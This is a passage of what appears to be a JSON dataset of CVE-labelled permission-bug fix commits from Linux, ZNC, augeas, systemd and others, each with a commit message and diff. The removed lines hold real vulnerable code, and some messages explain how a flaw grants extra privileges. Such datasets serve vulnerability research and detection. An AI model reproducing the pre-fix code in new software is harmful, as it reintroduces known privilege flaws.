b\/net\/ipv4\/ipip.c\nindex 988f52fba54a1..a5f58e7cbb26e 100644\n--- a\/net\/ipv4\/ipip.c\n+++ b\/net\/ipv4\/ipip.c\n@@ -913,4 +913,4 @@ static void __exit ipip_fini(void)\n module_init(ipip_init);\n module_exit(ipip_fini);\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"tunl0\");\n+MODULE_ALIAS_NETDEV(\"tunl0\");\ndiff --git a\/net\/ipv6\/sit.c b\/net\/ipv6\/sit.c\nindex 8ce38f10a547e..d2c16e10f6508 100644\n--- a\/net\/ipv6\/sit.c\n+++ b\/net\/ipv6\/sit.c\n@@ -1290,4 +1290,4 @@ static int __init sit_init(void)\n module_init(sit_init);\n module_exit(sit_cleanup);\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"sit0\");\n+MODULE_ALIAS_NETDEV(\"sit0\");\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-4440","CWE_ID":"264","category":"security","commit_id":"3ce424e45411cf5a13105e0386b6ecf6eeb4f66f","commit_message":"From 3ce424e45411cf5a13105e0386b6ecf6eeb4f66f Mon Sep 17 00:00:00 2001\nFrom: Roman Kagan <rkagan@virtuozzo.com>\nDate: Wed, 18 May 2016 17:48:20 +0300\nSubject: kvm:vmx: more complete state update on APICv on\/off\n\nThe function to update APICv on\/off state (in particular, to deactivate\nit when enabling Hyper-V SynIC) is incomplete: it doesn't adjust\nAPICv-related fields among secondary processor-based VM-execution\ncontrols.  As a result, Windows 2012 guests get stuck when SynIC-based\nauto-EOI interrupt intersected with e.g. an IPI in the guest.\n\nIn addition, the MSR intercept bitmap isn't updated every time \"virtualize\nx2APIC mode\" is toggled.  This path can only be triggered by a malicious\nguest, because Windows didn't use x2APIC but rather their own synthetic\nAPIC access MSRs; however a guest running in a SynIC-enabled VM could\nswitch to x2APIC and thus obtain direct access to host APIC MSRs\n(CVE-2016-4440).\n\nThe patch fixes those omissions.\n\nSigned-off-by: Roman Kagan <rkagan@virtuozzo.com>\nReported-by: Steve Rutherford <srutherford@google.com>\nReported-by: Yang Zhang <yang.zhang.wz@gmail.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch\/x86\/kvm\/vmx.c | 48 ++++++++++++++++++++++++++++++------------------\n 1 file changed, 30 insertions(+), 18 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/kvm\/vmx.c b\/arch\/x86\/kvm\/vmx.c\nindex 7ebf27bafe5c..378a23ab6093 100644\n--- a\/arch\/x86\/kvm\/vmx.c\n+++ b\/arch\/x86\/kvm\/vmx.c\n@@ -2418,7 +2418,9 @@ static void vmx_set_msr_bitmap(struct kvm_vcpu *vcpu)\n \n \tif (is_guest_mode(vcpu))\n \t\tmsr_bitmap = vmx_msr_bitmap_nested;\n-\telse if (vcpu->arch.apic_base & X2APIC_ENABLE) {\n+\telse if (cpu_has_secondary_exec_ctrls() &&\n+\t\t (vmcs_read32(SECONDARY_VM_EXEC_CONTROL) &\n+\t\t  SECONDARY_EXEC_VIRTUALIZE_X2APIC_MODE)) {\n \t\tif (is_long_mode(vcpu))\n \t\t\tmsr_bitmap = vmx_msr_bitmap_longmode_x2apic;\n \t\telse\n@@ -4783,6 +4785,19 @@ static void vmx_refresh_apicv_exec_ctrl(struct kvm_vcpu *vcpu)\n \tstruct vcpu_vmx *vmx = to_vmx(vcpu);\n \n \tvmcs_write32(PIN_BASED_VM_EXEC_CONTROL, vmx_pin_based_exec_ctrl(vmx));\n+\tif (cpu_has_secondary_exec_ctrls()) {\n+\t\tif (kvm_vcpu_apicv_active(vcpu))\n+\t\t\tvmcs_set_bits(SECONDARY_VM_EXEC_CONTROL,\n+\t\t\t\t      SECONDARY_EXEC_APIC_REGISTER_VIRT |\n+\t\t\t\t      SECONDARY_EXEC_VIRTUAL_INTR_DELIVERY);\n+\t\telse\n+\t\t\tvmcs_clear_bits(SECONDARY_VM_EXEC_CONTROL,\n+\t\t\t\t\tSECONDARY_EXEC_APIC_REGISTER_VIRT |\n+\t\t\t\t\tSECONDARY_EXEC_VIRTUAL_INTR_DELIVERY);\n+\t}\n+\n+\tif (cpu_has_vmx_msr_bitmap())\n+\t\tvmx_set_msr_bitmap(vcpu);\n }\n \n static u32 vmx_exec_control(struct vcpu_vmx *vmx)\n@@ -6329,23 +6344,20 @@ static __init int hardware_setup(void)\n \n \tset_bit(0, vmx_vpid_bitmap); \/* 0 is reserved for host *\/\n \n-\tif (enable_apicv) {\n-\t\tfor (msr = 0x800; msr <= 0x8ff; msr++)\n-\t\t\tvmx_disable_intercept_msr_read_x2apic(msr);\n-\n-\t\t\/* According SDM, in x2apic mode, the whole id reg is used.\n-\t\t * But in KVM, it only use the highest eight bits. Need to\n-\t\t * intercept it *\/\n-\t\tvmx_enable_intercept_msr_read_x2apic(0x802);\n-\t\t\/* TMCCT *\/\n-\t\tvmx_enable_intercept_msr_read_x2apic(0x839);\n-\t\t\/* TPR *\/\n-\t\tvmx_disable_intercept_msr_write_x2apic(0x808);\n-\t\t\/* EOI *\/\n-\t\tvmx_disable_intercept_msr_write_x2apic(0x80b);\n-\t\t\/* SELF-IPI *\/\n-\t\tvmx_disable_intercept_msr_write_x2apic(0x83f);\n-\t}\n+\tfor (msr = 0x800; msr <= 0x8ff; msr++)\n+\t\tvmx_disable_intercept_msr_read_x2apic(msr);\n+\n+\t\/* According SDM, in x2apic mode, the whole id reg is used.  But in\n+\t * KVM, it only use the highest eight bits. Need to intercept it *\/\n+\tvmx_enable_intercept_msr_read_x2apic(0x802);\n+\t\/* TMCCT *\/\n+\tvmx_enable_intercept_msr_read_x2apic(0x839);\n+\t\/* TPR *\/\n+\tvmx_disable_intercept_msr_write_x2apic(0x808);\n+\t\/* EOI *\/\n+\tvmx_disable_intercept_msr_write_x2apic(0x80b);\n+\t\/* SELF-IPI *\/\n+\tvmx_disable_intercept_msr_write_x2apic(0x83f);\n \n \tif (enable_ept) {\n \t\tkvm_mmu_set_mask_ptes(0ull,\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2018-14055","CWE_ID":"264","category":"security","commit_id":"a7bfbd93812950b7444841431e8e297e62cb524e","commit_message":"From a7bfbd93812950b7444841431e8e297e62cb524e Mon Sep 17 00:00:00 2001\nFrom: Alexey Sokolov <alexey+znc@asokolov.org>\nDate: Fri, 13 Jul 2018 23:26:44 +0100\nSubject: [PATCH] Don't let attackers inject rogue values into znc.conf\n\nBecause of this vulnerability, existing ZNC users could get Admin\npermissions.\n\nThanks for Jeriko One <jeriko.one@gmx.us> for finding and reporting this.\n---\n src\/Config.cpp | 13 ++++++++++---\n 1 file changed, 10 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/src\/Config.cpp b\/src\/Config.cpp\nindex 2543d6eee..0730b8945 100644\n--- a\/src\/Config.cpp\n+++ b\/src\/Config.cpp\n@@ -174,9 +174,14 @@ bool CConfig::Parse(CFile& file, CString& sErrorMsg) {\n void CConfig::Write(CFile& File, unsigned int iIndentation) {\n     CString sIndentation = CString(iIndentation, '\\t');\n \n+    auto SingleLine = [](const CString& s) {\n+        return s.Replace_n(\"\\r\", \"\").Replace_n(\"\\n\", \"\");\n+    };\n+\n     for (const auto& it : m_ConfigEntries) {\n         for (const CString& sValue : it.second) {\n-            File.Write(sIndentation + it.first + \" = \" + sValue + \"\\n\");\n+            File.Write(SingleLine(sIndentation + it.first + \" = \" + sValue) +\n+                       \"\\n\");\n         }\n     }\n \n@@ -184,9 +189,11 @@ void CConfig::Write(CFile& File, unsigned int iIndentation) {\n         for (const auto& it2 : it.second) {\n             File.Write(\"\\n\");\n \n-            File.Write(sIndentation + \"<\" + it.first + \" \" + it2.first + \">\\n\");\n+            File.Write(SingleLine(sIndentation + \"<\" + it.first + \" \" +\n+                                  it2.first + \">\") +\n+                       \"\\n\");\n             it2.second.m_pSubConfig->Write(File, iIndentation + 1);\n-            File.Write(sIndentation + \"<\/\" + it.first + \">\\n\");\n+            File.Write(SingleLine(sIndentation + \"<\/\" + it.first + \">\") + \"\\n\");\n         }\n     }\n }\n","owner":"znc","repo":"znc","source":"cve"},{"CVE_ID":"CVE-2010-1641","CWE_ID":"264","category":"security","commit_id":"7df0e0397b9a18358573274db9fdab991941062f","commit_message":"From 7df0e0397b9a18358573274db9fdab991941062f Mon Sep 17 00:00:00 2001\nFrom: Steven Whitehouse <swhiteho@redhat.com>\nDate: Mon, 24 May 2010 14:36:48 +0100\nSubject: GFS2: Fix permissions checking for setflags ioctl()\n\nWe should be checking for the ownership of the file for which\nflags are being set, rather than just for write access.\n\nReported-by: Dan Rosenberg <dan.j.rosenberg@gmail.com>\nSigned-off-by: Steven Whitehouse <swhiteho@redhat.com>\n---\n fs\/gfs2\/file.c | 7 +++++++\n 1 file changed, 7 insertions(+)\n\n","diff_code":"diff --git a\/fs\/gfs2\/file.c b\/fs\/gfs2\/file.c\nindex e6dd2aec6f82..b20bfcc9fa2d 100644\n--- a\/fs\/gfs2\/file.c\n+++ b\/fs\/gfs2\/file.c\n@@ -218,6 +218,11 @@ static int do_gfs2_set_flags(struct file *filp, u32 reqflags, u32 mask)\n \tif (error)\n \t\tgoto out_drop_write;\n \n+\terror = -EACCES;\n+\tif (!is_owner_or_cap(inode))\n+\t\tgoto out;\n+\n+\terror = 0;\n \tflags = ip->i_diskflags;\n \tnew_flags = (flags & ~mask) | (reqflags & mask);\n \tif ((new_flags ^ flags) == 0)\n@@ -275,8 +280,10 @@ static int gfs2_set_flags(struct file *filp, u32 __user *ptr)\n {\n \tstruct inode *inode = filp->f_path.dentry->d_inode;\n \tu32 fsflags, gfsflags;\n+\n \tif (get_user(fsflags, ptr))\n \t\treturn -EFAULT;\n+\n \tgfsflags = fsflags_cvt(fsflags_to_gfs2, fsflags);\n \tif (!S_ISDIR(inode->i_mode)) {\n \t\tif (gfsflags & GFS2_DIF_INHERIT_JDATA)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-0006","CWE_ID":"264","category":"security","commit_id":"867c20265459d30a01b021a9c1e81fb4c5832aa9","commit_message":"From 867c20265459d30a01b021a9c1e81fb4c5832aa9 Mon Sep 17 00:00:00 2001\nFrom: Mimi Zohar <zohar@linux.vnet.ibm.com>\nDate: Mon, 3 Jan 2011 14:59:10 -0800\nSubject: [PATCH] ima: fix add LSM rule bug\n\nIf security_filter_rule_init() doesn't return a rule, then not everything\nis as fine as the return code implies.\n\nThis bug only occurs when the LSM (eg. SELinux) is disabled at runtime.\n\nAdding an empty LSM rule causes ima_match_rules() to always succeed,\nignoring any remaining rules.\n\n default IMA TCB policy:\n  # PROC_SUPER_MAGIC\n  dont_measure fsmagic=0x9fa0\n  # SYSFS_MAGIC\n  dont_measure fsmagic=0x62656572\n  # DEBUGFS_MAGIC\n  dont_measure fsmagic=0x64626720\n  # TMPFS_MAGIC\n  dont_measure fsmagic=0x01021994\n  # SECURITYFS_MAGIC\n  dont_measure fsmagic=0x73636673\n\n  < LSM specific rule >\n  dont_measure obj_type=var_log_t\n\n  measure func=BPRM_CHECK\n  measure func=FILE_MMAP mask=MAY_EXEC\n  measure func=FILE_CHECK mask=MAY_READ uid=0\n\nThus without the patch, with the boot parameters 'tcb selinux=0', adding\nthe above 'dont_measure obj_type=var_log_t' rule to the default IMA TCB\nmeasurement policy, would result in nothing being measured.  The patch\nprevents the default TCB policy from being replaced.\n\nSigned-off-by: Mimi Zohar <zohar@us.ibm.com>\nCc: James Morris <jmorris@namei.org>\nAcked-by: Serge Hallyn <serge.hallyn@canonical.com>\nCc: David Safford <safford@watson.ibm.com>\nCc: <stable@kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n security\/integrity\/ima\/ima_policy.c | 2 ++\n 1 file changed, 2 insertions(+)\n\n","diff_code":"diff --git a\/security\/integrity\/ima\/ima_policy.c b\/security\/integrity\/ima\/ima_policy.c\nindex aef8c0a923ab8..d661afbe474c2 100644\n--- a\/security\/integrity\/ima\/ima_policy.c\n+++ b\/security\/integrity\/ima\/ima_policy.c\n@@ -253,6 +253,8 @@ static int ima_lsm_rule_init(struct ima_measure_rule_entry *entry,\n \tresult = security_filter_rule_init(entry->lsm[lsm_rule].type,\n \t\t\t\t\t   Audit_equal, args,\n \t\t\t\t\t   &entry->lsm[lsm_rule].rule);\n+\tif (!entry->lsm[lsm_rule].rule)\n+\t\treturn -EINVAL;\n \treturn result;\n }\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2009-3889","CWE_ID":"264","category":"security","commit_id":"66dca9b8c50b5e59d3bea8b21cee5c6dae6c9c46","commit_message":"From 66dca9b8c50b5e59d3bea8b21cee5c6dae6c9c46 Mon Sep 17 00:00:00 2001\nFrom: Joe Malicki <jmalicki@metacarta.com>\nDate: Thu, 14 Aug 2008 17:14:48 -0400\nSubject: [SCSI] megaraid_sas: remove sysfs dbg_lvl world writeable permissions\n\n\/sys\/bus\/pci\/drivers\/megaraid_sas\/dbg_lvl defaults to being\nworld-writable, which seems bad (letting any user affect kernel driver\nbehavior and logging level).\n\nThis turns off group and user write permissions, so that on typical\nproduction systems only root can write to it.\n\n[jejb: fix up rejections]\nSigned-off-by: Joseph Malicki <jmalicki@metacarta.com>\nAcked-by: \"Yang, Bo\" <Bo.Yang@lsi.com>\nSigned-off-by: James Bottomley <James.Bottomley@HansenPartnership.com>\n---\n drivers\/scsi\/megaraid\/megaraid_sas.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/drivers\/scsi\/megaraid\/megaraid_sas.c b\/drivers\/scsi\/megaraid\/megaraid_sas.c\nindex 870dc1c6302f..97b763378e7d 100644\n--- a\/drivers\/scsi\/megaraid\/megaraid_sas.c\n+++ b\/drivers\/scsi\/megaraid\/megaraid_sas.c\n@@ -3405,7 +3405,7 @@ megasas_sysfs_set_dbg_lvl(struct device_driver *dd, const char *buf, size_t coun\n \treturn retval;\n }\n \n-static DRIVER_ATTR(dbg_lvl, S_IRUGO|S_IWUGO, megasas_sysfs_show_dbg_lvl,\n+static DRIVER_ATTR(dbg_lvl, S_IRUGO|S_IWUSR, megasas_sysfs_show_dbg_lvl,\n \t\tmegasas_sysfs_set_dbg_lvl);\n \n static ssize_t\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-6412","CWE_ID":"264","category":"security","commit_id":"f5b4fc0ceb0e5a2be5f3a19f63ad936897a3ac26","commit_message":"From f5b4fc0ceb0e5a2be5f3a19f63ad936897a3ac26 Mon Sep 17 00:00:00 2001\nFrom: Dominic Cleal <dcleal@redhat.com>\nDate: Mon, 2 Dec 2013 17:49:35 +0000\nSubject: [PATCH] Fix umask handling when creating new files\n\n  * src\/transform.c (transform_save): faulty umask arithmetic would cause\n    overly-open file modes when the umask contains \"7\", as the umask was\n    incorrectly subtracted from the target file mode\n\nFixes CVE-2013-6412, RHBZ#1034261\n---\n src\/transform.c   |  2 +-\n tests\/test-save.c | 48 +++++++++++++++++++++++++++++++++++++++++++++++\n 2 files changed, 49 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/src\/transform.c b\/src\/transform.c\nindex 9f7653ea..10269125 100644\n--- a\/src\/transform.c\n+++ b\/src\/transform.c\n@@ -1144,7 +1144,7 @@ int transform_save(struct augeas *aug, struct tree *xfm,\n         mode_t curumsk = umask(022);\n         umask(curumsk);\n \n-        if (fchmod(fileno(fp), 0666 - curumsk) < 0) {\n+        if (fchmod(fileno(fp), 0666 & ~curumsk) < 0) {\n             err_status = \"create_chmod\";\n             return -1;\n         }\ndiff --git a\/tests\/test-save.c b\/tests\/test-save.c\nindex 617ef315..f28f6265 100644\n--- a\/tests\/test-save.c\n+++ b\/tests\/test-save.c\n@@ -26,6 +26,7 @@\n #include \"cutest.h\"\n \n #include <stdio.h>\n+#include <sys\/stat.h>\n #include <sys\/types.h>\n #include <sys\/wait.h>\n \n@@ -51,6 +52,7 @@ static void setup(CuTest *tc) {\n     if (asprintf(&lensdir, \"%s\/lenses\", abs_top_srcdir) < 0)\n         CuFail(tc, \"asprintf lensdir failed\");\n \n+    umask(0022);\n     run(tc, \"test -d %s && chmod -R u+w %s || :\", root, root);\n     run(tc, \"rm -rf %s\", root);\n     run(tc, \"mkdir -p %s\", root);\n@@ -221,6 +223,49 @@ static void testDoubleSlashPath(CuTest *tc) {\n     CuAssertIntEquals(tc, 1, r);\n }\n \n+\/* Check the umask is followed when creating files\n+ *\/\n+static void testUmask(CuTest *tc, int tumask, mode_t expected_mode) {\n+    int r;\n+    struct stat buf;\n+    char* fpath = NULL;\n+\n+    if (asprintf(&fpath, \"%s\/etc\/test\", root) < 0) {\n+        CuFail(tc, \"failed to set root\");\n+    }\n+\n+    umask(tumask);\n+\n+    r = aug_rm(aug, \"\/augeas\/load\/*\");\n+    CuAssertPositive(tc, r);\n+\n+    r = aug_set(aug, \"\/augeas\/load\/Test\/lens\", \"Simplelines.lns\");\n+    CuAssertRetSuccess(tc, r);\n+    r = aug_set(aug, \"\/augeas\/load\/Test\/incl\", \"\/etc\/test\");\n+    CuAssertRetSuccess(tc, r);\n+    r = aug_load(aug);\n+    CuAssertRetSuccess(tc, r);\n+    r = aug_set(aug, \"\/files\/etc\/test\/1\", \"test\");\n+    CuAssertRetSuccess(tc, r);\n+\n+    r = aug_save(aug);\n+    CuAssertRetSuccess(tc, r);\n+    r = aug_match(aug, \"\/augeas\/\/error\", NULL);\n+    CuAssertIntEquals(tc, 0, r);\n+\n+    CuAssertIntEquals(tc, 0, stat(fpath, &buf));\n+    CuAssertIntEquals(tc, expected_mode, buf.st_mode & 0777);\n+}\n+static void testUmask077(CuTest *tc) {\n+    testUmask(tc, 0077, 0600);\n+}\n+static void testUmask027(CuTest *tc) {\n+    testUmask(tc, 0027, 0640);\n+}\n+static void testUmask022(CuTest *tc) {\n+    testUmask(tc, 0022, 0644);\n+}\n+\n int main(void) {\n     char *output = NULL;\n     CuSuite* suite = CuSuiteNew();\n@@ -245,6 +290,9 @@ int main(void) {\n     SUITE_ADD_TEST(suite, testMtime);\n     SUITE_ADD_TEST(suite, testRelPath);\n     SUITE_ADD_TEST(suite, testDoubleSlashPath);\n+    SUITE_ADD_TEST(suite, testUmask077);\n+    SUITE_ADD_TEST(suite, testUmask027);\n+    SUITE_ADD_TEST(suite, testUmask022);\n \n     CuSuiteRun(suite);\n     CuSuiteSummary(suite, &output);\n","owner":"hercules-team","repo":"augeas","source":"cve"},{"CVE_ID":"CVE-2013-1979","CWE_ID":"264","category":"security","commit_id":"83f1b4ba917db5dc5a061a44b3403ddb6e783494","commit_message":"From 83f1b4ba917db5dc5a061a44b3403ddb6e783494 Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Fri, 19 Apr 2013 15:32:32 +0000\nSubject: [PATCH] net: fix incorrect credentials passing\n\nCommit 257b5358b32f (\"scm: Capture the full credentials of the scm\nsender\") changed the credentials passing code to pass in the effective\nuid\/gid instead of the real uid\/gid.\n\nObviously this doesn't matter most of the time (since normally they are\nthe same), but it results in differences for suid binaries when the wrong\nuid\/gid ends up being used.\n\nThis just undoes that (presumably unintentional) part of the commit.\n\nReported-by: Andy Lutomirski <luto@amacapital.net>\nCc: Eric W. Biederman <ebiederm@xmission.com>\nCc: Serge E. Hallyn <serge@hallyn.com>\nCc: David S. Miller <davem@davemloft.net>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nAcked-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n include\/net\/scm.h | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/include\/net\/scm.h b\/include\/net\/scm.h\nindex 975cca01048be..b11708105681e 100644\n--- a\/include\/net\/scm.h\n+++ b\/include\/net\/scm.h\n@@ -56,8 +56,8 @@ static __inline__ void scm_set_cred(struct scm_cookie *scm,\n \tscm->pid  = get_pid(pid);\n \tscm->cred = cred ? get_cred(cred) : NULL;\n \tscm->creds.pid = pid_vnr(pid);\n-\tscm->creds.uid = cred ? cred->euid : INVALID_UID;\n-\tscm->creds.gid = cred ? cred->egid : INVALID_GID;\n+\tscm->creds.uid = cred ? cred->uid : INVALID_UID;\n+\tscm->creds.gid = cred ? cred->gid : INVALID_GID;\n }\n \n static __inline__ void scm_destroy_cred(struct scm_cookie *scm)\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-10156","CWE_ID":"264","category":"security","commit_id":"06eeacb6fe029804f296b065b3ce91e796e1cd0e","commit_message":"From 06eeacb6fe029804f296b065b3ce91e796e1cd0e Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Mantas=20Mikul=C4=97nas?= <grawity@gmail.com>\nDate: Fri, 29 Jan 2016 23:36:08 +0200\nSubject: [PATCH] basic: fix touch() creating files with 07777 mode\n\nmode_t is unsigned, so MODE_INVALID < 0 can never be true.\n\nThis fixes a possible DoS where any user could fill \/run by writing to\na world-writable \/run\/systemd\/show-status.\n---\n src\/basic\/fs-util.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/src\/basic\/fs-util.c b\/src\/basic\/fs-util.c\nindex d31bd6e273f..61b651b573a 100644\n--- a\/src\/basic\/fs-util.c\n+++ b\/src\/basic\/fs-util.c\n@@ -341,7 +341,8 @@ int touch_file(const char *path, bool parents, usec_t stamp, uid_t uid, gid_t gi\n         if (parents)\n                 mkdir_parents(path, 0755);\n \n-        fd = open(path, O_WRONLY|O_CREAT|O_CLOEXEC|O_NOCTTY, mode > 0 ? mode : 0644);\n+        fd = open(path, O_WRONLY|O_CREAT|O_CLOEXEC|O_NOCTTY,\n+                        (mode == 0 || mode == MODE_INVALID) ? 0644 : mode);\n         if (fd < 0)\n                 return -errno;\n \n","owner":"systemd","repo":"systemd","source":"cve"},{"CVE_ID":"CVE-2012-2313","CWE_ID":"264","category":"security","commit_id":"1bb57e940e1958e40d51f2078f50c3a96a9b2d75","commit_message":"From 1bb57e940e1958e40d51f2078f50c3a96a9b2d75 Mon Sep 17 00:00:00 2001\nFrom: Jeff Mahoney <jeffm@suse.com>\nDate: Wed, 25 Apr 2012 14:32:09 +0000\nSubject: dl2k: Clean up rio_ioctl\n\nThe dl2k driver's rio_ioctl call has a few issues:\n- No permissions checking\n- Implements SIOCGMIIREG and SIOCGMIIREG using the SIOCDEVPRIVATE numbers\n- Has a few ioctls that may have been used for debugging at one point\n  but have no place in the kernel proper.\n\nThis patch removes all but the MII ioctls, renumbers them to use the\nstandard ones, and adds the proper permission check for SIOCSMIIREG.\n\nWe can also get rid of the dl2k-specific struct mii_data in favor of\nthe generic struct mii_ioctl_data.\n\nSince we have the phyid on hand, we can add the SIOCGMIIPHY ioctl too.\n\nMost of the MII code for the driver could probably be converted to use\nthe generic MII library but I don't have a device to test the results.\n\nReported-by: Stephan Mueller <stephan.mueller@atsec.com>\nSigned-off-by: Jeff Mahoney <jeffm@suse.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n drivers\/net\/ethernet\/dlink\/dl2k.c | 52 +++++++--------------------------------\n drivers\/net\/ethernet\/dlink\/dl2k.h |  7 ------\n 2 files changed, 9 insertions(+), 50 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/net\/ethernet\/dlink\/dl2k.c b\/drivers\/net\/ethernet\/dlink\/dl2k.c\nindex b2dc2c81a147..2e09edb9cdf8 100644\n--- a\/drivers\/net\/ethernet\/dlink\/dl2k.c\n+++ b\/drivers\/net\/ethernet\/dlink\/dl2k.c\n@@ -1259,55 +1259,21 @@ rio_ioctl (struct net_device *dev, struct ifreq *rq, int cmd)\n {\n \tint phy_addr;\n \tstruct netdev_private *np = netdev_priv(dev);\n-\tstruct mii_data *miidata = (struct mii_data *) &rq->ifr_ifru;\n-\n-\tstruct netdev_desc *desc;\n-\tint i;\n+\tstruct mii_ioctl_data *miidata = if_mii(rq);\n \n \tphy_addr = np->phy_addr;\n \tswitch (cmd) {\n-\tcase SIOCDEVPRIVATE:\n-\t\tbreak;\n-\n-\tcase SIOCDEVPRIVATE + 1:\n-\t\tmiidata->out_value = mii_read (dev, phy_addr, miidata->reg_num);\n+\tcase SIOCGMIIPHY:\n+\t\tmiidata->phy_id = phy_addr;\n \t\tbreak;\n-\tcase SIOCDEVPRIVATE + 2:\n-\t\tmii_write (dev, phy_addr, miidata->reg_num, miidata->in_value);\n+\tcase SIOCGMIIREG:\n+\t\tmiidata->val_out = mii_read (dev, phy_addr, miidata->reg_num);\n \t\tbreak;\n-\tcase SIOCDEVPRIVATE + 3:\n-\t\tbreak;\n-\tcase SIOCDEVPRIVATE + 4:\n-\t\tbreak;\n-\tcase SIOCDEVPRIVATE + 5:\n-\t\tnetif_stop_queue (dev);\n+\tcase SIOCSMIIREG:\n+\t\tif (!capable(CAP_NET_ADMIN))\n+\t\t\treturn -EPERM;\n+\t\tmii_write (dev, phy_addr, miidata->reg_num, miidata->val_in);\n \t\tbreak;\n-\tcase SIOCDEVPRIVATE + 6:\n-\t\tnetif_wake_queue (dev);\n-\t\tbreak;\n-\tcase SIOCDEVPRIVATE + 7:\n-\t\tprintk\n-\t\t    (\"tx_full=%x cur_tx=%lx old_tx=%lx cur_rx=%lx old_rx=%lx\\n\",\n-\t\t     netif_queue_stopped(dev), np->cur_tx, np->old_tx, np->cur_rx,\n-\t\t     np->old_rx);\n-\t\tbreak;\n-\tcase SIOCDEVPRIVATE + 8:\n-\t\tprintk(\"TX ring:\\n\");\n-\t\tfor (i = 0; i < TX_RING_SIZE; i++) {\n-\t\t\tdesc = &np->tx_ring[i];\n-\t\t\tprintk\n-\t\t\t    (\"%02x:cur:%08x next:%08x status:%08x frag1:%08x frag0:%08x\",\n-\t\t\t     i,\n-\t\t\t     (u32) (np->tx_ring_dma + i * sizeof (*desc)),\n-\t\t\t     (u32)le64_to_cpu(desc->next_desc),\n-\t\t\t     (u32)le64_to_cpu(desc->status),\n-\t\t\t     (u32)(le64_to_cpu(desc->fraginfo) >> 32),\n-\t\t\t     (u32)le64_to_cpu(desc->fraginfo));\n-\t\t\tprintk (\"\\n\");\n-\t\t}\n-\t\tprintk (\"\\n\");\n-\t\tbreak;\n-\n \tdefault:\n \t\treturn -EOPNOTSUPP;\n \t}\ndiff --git a\/drivers\/net\/ethernet\/dlink\/dl2k.h b\/drivers\/net\/ethernet\/dlink\/dl2k.h\nindex ba0adcafa55a..30c2da3de548 100644\n--- a\/drivers\/net\/ethernet\/dlink\/dl2k.h\n+++ b\/drivers\/net\/ethernet\/dlink\/dl2k.h\n@@ -365,13 +365,6 @@ struct ioctl_data {\n \tchar *data;\n };\n \n-struct mii_data {\n-\t__u16 reserved;\n-\t__u16 reg_num;\n-\t__u16 in_value;\n-\t__u16 out_value;\n-};\n-\n \/* The Rx and Tx buffer descriptors. *\/\n struct netdev_desc {\n \t__le64 next_desc;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2009-2846","CWE_ID":"264","category":"security","commit_id":"6b4dbcd86a9d464057fcc7abe4d0574093071fcc","commit_message":"From 6b4dbcd86a9d464057fcc7abe4d0574093071fcc Mon Sep 17 00:00:00 2001\nFrom: Michael Buesch <mb@bu3sch.de>\nDate: Mon, 20 Jul 2009 22:58:44 +0000\nSubject: parisc: isa-eeprom - Fix loff_t usage\n\nloff_t is a signed type. If userspace passes a negative ppos, the \"count\"\nrange check is weakened. \"count\"s bigger than HPEE_MAX_LENGTH will pass the check.\nAlso, if ppos is negative, the readb(eisa_eeprom_addr + *ppos) will poke in random\nmemory.\n\nSigned-off-by: Michael Buesch <mb@bu3sch.de>\nCc: stable@kernel.org\nSigned-off-by: Helge Deller <deller@gmx.de>\n---\n drivers\/parisc\/eisa_eeprom.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/drivers\/parisc\/eisa_eeprom.c b\/drivers\/parisc\/eisa_eeprom.c\nindex 685d94e69d44..8c0b26e9b98a 100644\n--- a\/drivers\/parisc\/eisa_eeprom.c\n+++ b\/drivers\/parisc\/eisa_eeprom.c\n@@ -55,7 +55,7 @@ static ssize_t eisa_eeprom_read(struct file * file,\n \tssize_t ret;\n \tint i;\n \t\n-\tif (*ppos >= HPEE_MAX_LENGTH)\n+\tif (*ppos < 0 || *ppos >= HPEE_MAX_LENGTH)\n \t\treturn 0;\n \t\n \tcount = *ppos + count < HPEE_MAX_LENGTH ? count : HPEE_MAX_LENGTH - *ppos;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-4157","CWE_ID":"264","category":"security","commit_id":"137f7df8cead00688524c82360930845396b8a21","commit_message":"From 137f7df8cead00688524c82360930845396b8a21 Mon Sep 17 00:00:00 2001\nFrom: Markos Chandras <markos.chandras@imgtec.com>\nDate: Wed, 22 Jan 2014 14:40:00 +0000\nSubject: MIPS: asm: thread_info: Add _TIF_SECCOMP flag\n\nAdd _TIF_SECCOMP flag to _TIF_WORK_SYSCALL_ENTRY to indicate\nthat the system call needs to be checked against a seccomp filter.\n\nSigned-off-by: Markos Chandras <markos.chandras@imgtec.com>\nReviewed-by: Paul Burton 